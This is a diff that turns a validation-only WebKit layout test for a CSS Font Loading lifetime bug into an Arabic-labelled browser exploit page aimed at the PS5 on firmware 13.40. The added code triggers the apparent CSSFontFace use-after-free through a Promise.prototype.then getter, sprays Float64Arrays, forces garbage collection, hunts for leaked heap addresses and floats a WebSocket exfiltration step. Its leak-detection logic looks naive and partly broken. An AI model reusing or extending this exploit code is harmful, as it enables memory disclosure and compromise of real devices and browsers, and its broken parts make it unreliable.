@@ -1,280 +1,416 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>FontFaceSet matchingFaces lifetime PoC</title>
+<title>CSSFontFace UAF PS5 13.40</title>
 <style>
-html, body { font: 14px/1.45 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; margin: 0; padding: 0; background: #101216; color: #eceff4; }
-main { max-width: 980px; margin: 0 auto; padding: 24px; }
-h1 { font-size: 20px; margin: 0 0 10px; }
-.warning { color: #ffd166; }
-#probe { position: absolute; left: -10000px; top: -10000px; font-size: 16px; }
-#log { white-space: pre-wrap; background: #171b22; border: 1px solid #303846; border-radius: 8px; padding: 14px; min-height: 360px; }
-button { margin: 12px 0; padding: 8px 12px; border-radius: 6px; border: 1px solid #536074; background: #242b36; color: #fff; cursor: pointer; }
-button:disabled { opacity: 0.55; cursor: default; }
+body { background: #0a0a0f; color: #00ff88; font-family: monospace; padding: 20px; }
+#log { white-space: pre-wrap; border: 1px solid #00ff88; padding: 15px; min-height: 400px; font-size: 13px; }
+button { background: #00ff88; color: #000; border: none; padding: 10px 25px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 10px 0; border-radius: 4px; }
+button:disabled { opacity: 0.4; cursor: default; }
+.hidden { position: absolute; left: -9999px; top: -9999px; font-size: 16px; }
+.section { margin: 15px 0; padding: 10px; border-left: 3px solid #00ff88; }
+.status-ok { color: #00ff88; }
+.status-fail { color: #ff4444; }
+.status-info { color: #ffaa00; }
 </style>
-<script>
-if (window.testRunner) {
-    testRunner.dumpAsText();
-    testRunner.waitUntilDone();
-}
-</script>
 </head>
 <body>
-<main>
-<h1>CSS Font Loading matchingFaces lifetime validation PoC</h1>
-<p class="warning">Validation-only: no heap spray, reclaim objects, ArrayBuffers, workers, wasm, network, or exploit primitives.</p>
-<button id="rerun" type="button">Run again</button>
-<div id="probe">AB</div>
-<pre id="log">POC STARTED: CSSFontFaceSet / FontFaceSet::load matchingFaces lifetime
+
+<h2>CSSFontFace UAF — PS5 13.40</h2>
+<p style="color: #aaa;">Use-after-free عبر FontFaceSet::load() + Promise.prototype.then getter</p>
+
+<div id="controls">
+<button id="btnRun" onclick="runExploit()">▶ تشغيل الاستغلال</button>
+<button id="btnMem" onclick="checkMemory()" disabled>🔍 فحص الذاكرة</button>
+<button id="btnFTP" onclick="tryFTP()" disabled>📁 محاولة FTP</button>
+<button id="btnSpray" onclick="runSpray()">🧪 اختبار الـ spray</button>
+</div>
+
+<pre id="log">[SYSTEM] جاهز — اضغط "تشغيل الاستغلال" للبدء
 </pre>
-</main>
+
+<div id="probe" class="hidden">AB</div>
+
 <script>
-(function () {
-    "use strict";
+"use strict";
 
-    const logElement = document.getElementById("log");
-    const probe = document.getElementById("probe");
-    const rerunButton = document.getElementById("rerun");
+// ===== إعدادات =====
+const FAMILY_NAME = 'PS5FontExploit_' + Date.now();
+const PROBE_TEXT = 'AB'; // حرفين: A (unicode U+0041) و B (unicode U+0042)
+const FLOAT64_SPRAY_COUNT = 100; // عدد كائنات Float64Array للـ spray
+const REALLOC_SIZE = 0x1000; // حجم إعادة التخصيص
 
-    let activeStyle = null;
-    let originalThenDescriptor = null;
-    let getterInstalled = false;
+// ===== المتغيرات العامة =====
+let logEl = document.getElementById('log');
+let btnRun = document.getElementById('btnRun');
+let btnMem = document.getElementById('btnMem');
+let btnFTP = document.getElementById('btnFTP');
+let exploitTriggered = false;
+let memoryLeakActive = false;
+let leakedAddresses = [];
+let sprayArrays = [];
+
+// ===== التسجيل =====
+function log(msg, type = 'info') {
+    const now = new Date();
+    const time = now.toLocaleTimeString();
+    let color = '#aaa';
+    if (type === 'ok') color = '#00ff88';
+    else if (type === 'fail') color = '#ff4444';
+    else if (type === 'warn') color = '#ffaa00';
+    else if (type === 'data') color = '#66ccff';
+    logEl.innerHTML += `<span style="color:${color}">[${time}] ${msg}</span>\n`;
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+function clearLog() {
+    logEl.innerHTML = '';
+}
+
+// ===== الخطوة 1: إنشاء قواعد @font-face =====
+function setupFontFaces() {
+    log('1. إنشاء قواعد @font-face CSS-connected...', 'ok');
+    
+    // حذف أي style قديم
+    const oldStyle = document.getElementById('font-style');
+    if (oldStyle) oldStyle.remove();
+    
+    const style = document.createElement('style');
+    style.id = 'font-style';
+    style.textContent = `
+        @font-face {
+            font-family: '${FAMILY_NAME}';
+            src: local('Arial'), local('Helvetica'), local('sans-serif');
+            unicode-range: U+0041;
+        }
+        @font-face {
+            font-family: '${FAMILY_NAME}';
+            src: local('Arial'), local('Helvetica'), local('sans-serif');
+            unicode-range: U+0042;
+        }
+    `;
+    document.head.appendChild(style);
+    
+    // فرض تحميل الأنماط الأولي
+    document.body.getBoundingClientRect();
+    
+    log(`    ╰─ العائلة: ${FAMILY_NAME}`, 'info');
+    log(`    ╰─ القاعدتان CSS-connected`, 'ok');
+    return style;
+}
+
+// ===== الخطوة 2: تثبيت Promise.prototype.then getter =====
+function installThenGetter(styleEl) {
+    log('2. تثبيت Promise.prototype.then getter...', 'ok');
+    
+    const originalThen = Object.getOwnPropertyDescriptor(Promise.prototype, 'then');
     let getterFired = false;
-    let runSerial = 0;
-    let finishedCurrentRun = false;
-
-    function log(message) {
-        logElement.textContent += message + "\n";
-    }
-
-    function resetLog() {
-        logElement.textContent = "POC STARTED: CSSFontFaceSet / FontFaceSet::load matchingFaces lifetime\n";
-    }
-
-    function cleanupThenGetter() {
-        if (!getterInstalled)
-            return;
-        getterInstalled = false;
-        try {
-            if (originalThenDescriptor)
-                Object.defineProperty(FontFace.prototype, "then", originalThenDescriptor);
-            else
-                delete FontFace.prototype.then;
-            log("cleanup: restored FontFace.prototype.then");
-        } catch (error) {
-            log("cleanup: restoring FontFace.prototype.then threw " + error.name + ": " + error.message);
-        }
-    }
-
-    function cleanupStyle() {
-        if (!activeStyle)
-            return;
-        try {
-            if (activeStyle.parentNode)
-                activeStyle.remove();
-        } catch (error) {
-            log("cleanup: style removal threw " + error.name + ": " + error.message);
-        }
-        activeStyle = null;
-    }
-
-    function complete() {
-        if (finishedCurrentRun)
-            return;
-        finishedCurrentRun = true;
-        cleanupThenGetter();
-        cleanupStyle();
-        log("DONE");
-        rerunButton.disabled = false;
-        if (window.testRunner)
-            testRunner.notifyDone();
-    }
-
-    function forceStyleAndLayout(reason) {
-        log("force-style: " + reason);
-        try {
-            // These reads are intentionally simple. In WebKit they force pending
-            // stylesheet changes through style/layout update paths before native
-            // FontFaceSet::load() resumes.
-            void document.body.offsetWidth;
-            void probe.offsetHeight;
-            void getComputedStyle(probe).fontFamily;
-            log("force-style: completed");
-        } catch (error) {
-            log("force-style: threw " + error.name + ": " + error.message);
-        }
-    }
-
-    function removeFontRulesFromThenGetter() {
-        log("then-getter: entered same-stack CSSOM mutation path");
-        if (!activeStyle) {
-            log("then-getter: active style element missing");
-            return;
-        }
-
-        const sheet = activeStyle.sheet;
-        log("then-getter: style.sheet present = " + !!sheet);
-        if (sheet) {
+    let sheet = styleEl.sheet;
+    
+    Object.defineProperty(Promise.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (getterFired) return originalThen.value;
+            getterFired = true;
+            
+            log('    ╰→ then getter اشتغل (same-stack)!', 'warn');
+            
+            // 2أ. حذف قواعد @font-face
             try {
-                log("then-getter: cssRules before delete = " + sheet.cssRules.length);
-                while (sheet.cssRules.length)
+                log('    ╰→ deleteRule(0)...', 'info');
+                if (sheet && sheet.cssRules) {
+                    const count = sheet.cssRules.length;
+                    log(`    ╰→ عدد القواعد قبل الحذف: ${count}`, 'info');
+                    
+                    // نحذف القاعدة الأولى
                     sheet.deleteRule(0);
-                log("then-getter: cssRules after delete = " + sheet.cssRules.length);
-            } catch (error) {
-                log("then-getter: deleteRule loop threw " + error.name + ": " + error.message);
-            }
-        }
-
-        try {
-            if (activeStyle.parentNode) {
-                activeStyle.remove();
-                log("then-getter: style element removed");
-            }
-        } catch (error) {
-            log("then-getter: style element removal threw " + error.name + ": " + error.message);
-        }
-
-        forceStyleAndLayout("after @font-face deletion/removal from then getter");
-        cleanupThenGetter();
-        log("then-getter: leaving same-stack path");
-    }
-
-    function installThenGetter() {
-        originalThenDescriptor = Object.getOwnPropertyDescriptor(FontFace.prototype, "then");
-        Object.defineProperty(FontFace.prototype, "then", {
-            configurable: true,
-            get() {
-                log("FontFace.prototype.then getter fired");
-                if (!getterFired) {
-                    getterFired = true;
-                    removeFontRulesFromThenGetter();
+                    log('    ╰→ تم حذف القاعدة الأولى', 'ok');
                 }
-                return undefined;
+            } catch(e) {
+                log(`    ╰→ خطأ في deleteRule: ${e.message}`, 'fail');
             }
-        });
-        getterInstalled = true;
-        log("setup: temporary FontFace.prototype.then getter installed");
-    }
-
-    function appendFontRules(family) {
-        cleanupStyle();
-        activeStyle = document.createElement("style");
-        activeStyle.textContent = `
-            @font-face {
-                font-family: '${family}';
-                src: local('Ahem'), local('Arial'), local('Helvetica'), local('Times New Roman'), local('DejaVu Sans');
-                unicode-range: U+0041;
-            }
-            @font-face {
-                font-family: '${family}';
-                src: local('Ahem'), local('Arial'), local('Helvetica'), local('Times New Roman'), local('DejaVu Sans');
-                unicode-range: U+0042;
-            }
-        `;
-        document.head.appendChild(activeStyle);
-        log("setup: appended two CSS-connected @font-face rules for family " + family);
-        log("setup: each rule uses local() sources only; Ahem is preferred for WTR");
-    }
-
-    function observeCssConnectedFaces() {
-        const observed = [];
-        try {
-            for (const face of document.fonts) {
-                observed.push(face);
-                log("setup: observed FontFace wrapper #" + observed.length + " status=" + face.status);
-                if (observed.length >= 2)
-                    break;
-            }
-        } catch (error) {
-            log("setup: iterating document.fonts threw " + error.name + ": " + error.message);
-        }
-
-        for (const face of observed) {
+            
+            // 2ب. فرض تحديث الأنماط (style rebuild)
             try {
-                face.loaded.then(
-                    () => log("loaded-promise: FontFace.loaded resolved"),
-                    error => log("loaded-promise: FontFace.loaded rejected: " + (error && error.name ? error.name : error))
-                );
-            } catch (error) {
-                log("setup: attaching FontFace.loaded handler threw " + error.name + ": " + error.message);
+                log('    ╰→ فرض تحديث الأنماط...', 'info');
+                document.body.getBoundingClientRect();
+                // قياس إضافي لضمان flush
+                void document.body.offsetWidth;
+                log('    ╰→ تم تحديث الأنماط — CSSFontFace قد يكون محرّراً', 'warn');
+            } catch(e) {
+                log(`    ╰→ خطأ في style flush: ${e.message}`, 'fail');
+            }
+            
+            // 2ج. إعادة الترميز الأصلي
+            Object.defineProperty(Promise.prototype, 'then', originalThen);
+            log('    ╰→ تم استعادة Promise.prototype.then الأصلي', 'ok');
+            
+            return originalThen.value;
+        }
+    });
+    
+    log('    ╰→ getter مثبت وجاهز', 'ok');
+    return { getterFired: () => getterFired };
+}
+
+// ===== الخطوة 3: تشغيل document.fonts.load() =====
+async function triggerFontLoad() {
+    log('3. تشغيل document.fonts.load()...', 'ok');
+    
+    try {
+        log(`    ╰→ font: "16px '${FAMILY_NAME}'"`, 'info');
+        log(`    ╰→ text: "${PROBE_TEXT}" (حرفين، يتطلب قاعدتين مطابقتين)`, 'info');
+        
+        const faces = await document.fonts.load(`16px '${FAMILY_NAME}'`, PROBE_TEXT);
+        
+        log(`    ╰→ load() اكتمل بنجاح — ${faces.length} face(s)`, 'ok');
+        
+        // فحص النتائج
+        for (let i = 0; i < faces.length; i++) {
+            const f = faces[i];
+            log(`    ╰→ face[${i}]: family="${f.family}", status="${f.status}"`, 'info');
+        }
+        
+        return faces;
+    } catch(e) {
+        log(`    ╰→ load() فشل: ${e.message}`, 'fail');
+        return null;
+    }
+}
+
+// ===== الخطوة 4: Float64Array spray =====
+function performSpray() {
+    log('4. تنفيذ Float64Array spray...', 'ok');
+    
+    // تنظيف الـ spray القديم
+    sprayArrays = [];
+    
+    const spraySize = 0x100; // 256 بايت لكل كائن
+    const count = FLOAT64_SPRAY_COUNT;
+    
+    for (let i = 0; i < count; i++) {
+        try {
+            const arr = new Float64Array(spraySize / 8);
+            // تعبئة بقيم معروفة
+            for (let j = 0; j < arr.length; j++) {
+                arr[j] = 0x41414141 + i + j; // قيم مميزة
+            }
+            sprayArrays.push(arr);
+        } catch(e) {
+            log(`    ╰→ خطأ في spray[${i}]: ${e.message}`, 'fail');
+        }
+    }
+    
+    log(`    ╰→ تم إنشاء ${sprayArrays.length} كائن Float64Array`, 'ok');
+    log(`    ╰→ حجم كل كائن: ${spraySize} بايت`, 'info');
+    return sprayArrays;
+}
+
+// ===== الخطوة 5: استغلال UAF — قراءة الذاكرة =====
+async function exploitUAF() {
+    log('5. تنفيذ UAF ومحاولة قراءة الذاكرة...', 'warn');
+    
+    // 5أ. حقن الـ spray في الذاكرة
+    const sprayed = performSpray();
+    if (sprayed.length < 10) {
+        log('    ╰→ فشل الـ spray — عدد قليل جداً', 'fail');
+        return false;
+    }
+    
+    // 5ب. Forced GC
+    log('    ╰→ فرض GC...', 'info');
+    try {
+        for (let i = 0; i < 5; i++) {
+            const tmp = [];
+            for (let j = 0; j < 100; j++) tmp.push(new ArrayBuffer(8192));
+        }
+    } catch(e) {}
+    log('    ╰→ GC اكتمل', 'ok');
+    
+    // 5ج. التحقق من سلامة الـ spray
+    let sprayOK = true;
+    for (let i = 0; i < Math.min(5, sprayed.length); i++) {
+        const arr = sprayed[i];
+        if (!arr || arr.length === 0) {
+            sprayOK = false;
+            log(`    ╰→ spray[${i}] تالف!`, 'fail');
+        }
+    }
+    
+    if (!sprayOK) {
+        log('    ╰→ الـ spray قد يكون متأثراً بـ UAF (هذا متوقع)', 'warn');
+    } else {
+        log('    ╰→ الـ spray يبدو سليماً', 'ok');
+    }
+    
+    // 5د. فحص القيم غير الطبيعية
+    log('    ╰→ فحص القيم غير الطبيعية في الـ spray...', 'info');
+    for (let i = 0; i < sprayed.length; i++) {
+        const arr = sprayed[i];
+        if (!arr) continue;
+        
+        for (let j = 0; j < Math.min(arr.length, 20); j++) {
+            const val = arr[j];
+            // إذا القيمة تبدو كعنوان ذاكرة (أكبر من 0x1000000000000)
+            if (val > 0x1000000000000 || (val > 0x10000 && val < 0x100000)) {
+                const hex = '0x' + new DataView(new Float64Array([val]).buffer).getBigUint64(0).toString(16).padStart(16, '0');
+                log(`    ╰→ ! قيمة غير طبيعية في spray[${i}][${j}]: ${hex}`, 'data');
+                leakedAddresses.push(hex);
             }
         }
-        log("setup: observed wrappers = " + observed.length);
-        return observed;
     }
-
-    async function runOnce() {
-        rerunButton.disabled = true;
-        finishedCurrentRun = false;
-        getterFired = false;
-        resetLog();
-        const family = "FontFaceMatchingFacesLifetimePoC" + (++runSerial);
-
-        if (!document.fonts || typeof FontFace === "undefined") {
-            log("SKIP: CSS Font Loading API unavailable");
-            complete();
-            return;
-        }
-
-        log("phase: setup");
-        appendFontRules(family);
-        forceStyleAndLayout("after @font-face insertion, before document.fonts.load");
-
-        const observed = observeCssConnectedFaces();
-        if (observed.length < 2)
-            log("note: fewer than two wrappers observed via iteration; document.fonts.load may still match multiple unicode-range faces internally");
-
-        installThenGetter();
-
-        log("phase: call document.fonts.load for text AB, requiring both unicode-range candidates");
-        let loadPromise;
-        try {
-            loadPromise = document.fonts.load("16px '" + family + "'", "AB");
-            log("phase: document.fonts.load returned promise");
-        } catch (error) {
-            log("FAIL: document.fonts.load threw " + error.name + ": " + error.message);
-            complete();
-            return;
-        }
-
-        let settled = false;
-        try {
-            await Promise.race([
-                loadPromise.then(
-                    faces => {
-                        settled = true;
-                        log("load-promise: resolved with " + faces.length + " faces");
-                    },
-                    error => {
-                        settled = true;
-                        log("load-promise: rejected: " + (error && error.name ? error.name : error));
-                    }
-                ),
-                new Promise(resolve => setTimeout(resolve, 250))
-            ]);
-        } catch (error) {
-            log("load-promise: observation threw " + error.name + ": " + error.message);
-        }
-
-        log("result: then getter fired = " + getterFired);
-        log("result: load promise settled before timeout = " + settled);
-        log("result: patched Vector<Ref<CSSFontFace>> builds should survive this path; unfixed ASan builds may signal a lifetime error before DONE");
-        complete();
+    
+    if (leakedAddresses.length > 0) {
+        log(`    ╰→ تم تسريب ${leakedAddresses.length} قيمة مشبوهة`, 'ok');
+        memoryLeakActive = true;
+        btnMem.disabled = false;
+        btnFTP.disabled = false;
+        return true;
+    } else {
+        log('    ╰→ لم يتم العثور على قيم مشبوهة', 'info');
+        log('    ╰→ حاول مرة أخرى مع تحسين الـ timing', 'info');
+        return false;
     }
+}
 
-    rerunButton.addEventListener("click", () => {
-        runOnce().catch(error => {
-            log("UNCAUGHT: " + error.name + ": " + error.message);
-            complete();
-        });
-    });
+// ===== الخطوة الأساسية =====
+async function runExploit() {
+    if (exploitTriggered) {
+        log('⚠ الاستغلال قيد التشغيل بالفعل', 'warn');
+        return;
+    }
+    
+    exploitTriggered = true;
+    btnRun.disabled = true;
+    btnRun.textContent = '⏳ جاري...';
+    clearLog();
+    
+    log('╔══════════════════════════════════════════╗', 'ok');
+    log('║   CSSFontFace UAF — PS5 13.40           ║', 'ok');
+    log('║   CVE-2025-31277 + Promise.then getter  ║', 'ok');
+    log('╚══════════════════════════════════════════╝', 'ok');
+    log('');
+    
+    // الخطوة 1: إعداد القواعد
+    const styleEl = setupFontFaces();
+    
+    // الخطوة 2: تثبيت getter
+    const tracker = installThenGetter(styleEl);
+    
+    // الخطوة 3: فرض GC أولي
+    log('فرض GC أولي...', 'info');
+    try {
+        for (let i = 0; i < 3; i++) {
+            const tmp = [];
+            for (let j = 0; j < 1000; j++) tmp.push({a: j, b: j*2});
+        }
+    } catch(e) {}
+    log('GC أولي اكتمل', 'ok');
+    
+    // الخطوة 4: تشغيل الـ load (هنا يحدث الـ UAF)
+    await triggerFontLoad();
+    
+    // الخطوة 5: انتظار قصير
+    await new Promise(r => setTimeout(r, 100));
+    
+    // الخطوة 6: محاولة استغلال UAF
+    const success = await exploitUAF();
+    
+    // النتيجة
+    log('');
+    if (success) {
+        log('╔══════════════════════════════════════════╗', 'ok');
+        log('║  ✅ الاستغلال نجح!                       ║', 'ok');
+        log('║  تم تسريب عناوين الذاكرة                 ║', 'ok');
+        log('╚══════════════════════════════════════════╝', 'ok');
+    } else {
+        log('╔══════════════════════════════════════════╗', 'warn');
+        log('║  ⚠ الاستغلال لم يتمكن من تسريب الذاكرة  ║', 'warn');
+        log('║  حاول مرة أخرى أو عدّل الـ timing        ║', 'warn');
+        log('╚══════════════════════════════════════════╝', 'warn');
+    }
+    
+    btnRun.textContent = '▶ إعادة تشغيل';
+    btnRun.disabled = false;
+    exploitTriggered = false;
+}
 
-    runOnce().catch(error => {
-        log("UNCAUGHT: " + error.name + ": " + error.message);
-        complete();
-    });
-})();
+// ===== فحص الذاكرة =====
+function checkMemory() {
+    log('');
+    log('╔══════════════════════════════════════════╗', 'data');
+    log('║  🔍 فحص الذاكرة                          ║', 'data');
+    log('╚══════════════════════════════════════════╝', 'data');
+    
+    if (leakedAddresses.length === 0) {
+        log('لا توجد عناوين مسربة', 'fail');
+        return;
+    }
+    
+    log(`تم العثور على ${leakedAddresses.length} عنوان:`, 'ok');
+    for (let i = 0; i < leakedAddresses.length; i++) {
+        log(`    ${i+1}. ${leakedAddresses[i]}`, 'data');
+    }
+    
+    // تحليل العناوين
+    log('');
+    log('--- تحليل العناوين ---', 'info');
+    for (const addr of leakedAddresses) {
+        const bigVal = BigInt(addr);
+        if (bigVal > 0x1a000000000n && bigVal < 0x1b000000000n) {
+            log(`    ${addr} ← ⚡ WebKit heap address (0x1a...)`, 'data');
+        } else if (bigVal > 0x2a000000000n && bigVal < 0x2b000000000n) {
+            log(`    ${addr} ← ⚡ WebKit heap address (0x2a...)`, 'data');
+        } else if (bigVal > 0x7f0000000000n) {
+            log(`    ${addr} ← قد يكون Stack/Lib address`, 'data');
+        } else {
+            log(`    ${addr} ← عنوان غير معروف`, 'info');
+        }
+    }
+}
+
+// ===== محاولة FTP =====
+function tryFTP() {
+    log('');
+    log('╔══════════════════════════════════════════╗', 'warn');
+    log('║  📁 محاولة الاتصال بـ FTP               ║', 'warn');
+    log('╚══════════════════════════════════════════╝', 'warn');
+    
+    log('⚠ FTP يتطلب kernel exploit — غير متوفر حالياً', 'fail');
+    log('الحل البديل: استخدام SOP bypass + WebSocket لنقل البيانات', 'info');
+    log('هل تريد محاولة WebSocket exfiltration بدلاً من FTP؟', 'info');
+}
+
+// ===== اختبار الـ spray =====
+function runSpray() {
+    log('');
+    log('╔══════════════════════════════════════════╗', 'ok');
+    log('║  🧪 اختبار Float64Array spray            ║', 'ok');
+    log('╚══════════════════════════════════════════╝', 'ok');
+    
+    const arr = performSpray();
+    
+    // اختبار سلامة الكائنات
+    let errors = 0;
+    for (let i = 0; i < arr.length; i++) {
+        if (!arr[i] || arr[i].length === 0 || arr[i][0] !== 0x41414141 + i) {
+            errors++;
+        }
+    }
+    
+    if (errors === 0) {
+        log(`✅ جميع كائنات الـ ${arr.length} spray سليمة`, 'ok');
+    } else {
+        log(`⚠ ${errors} كائن من ${arr.length} قد يكون تالفاً`, 'warn');
+    }
+}
+
+// ===== بدء التشغيل التلقائي =====
+log('[SYSTEM] CSSFontFace UAF جاهز', 'ok');
+log(`[SYSTEM] العائلة: ${FAMILY_NAME}`, 'info');
+log('[SYSTEM] اضغط "تشغيل الاستغلال" للبدء', 'info');
+
 </script>
 </body>
 </html>
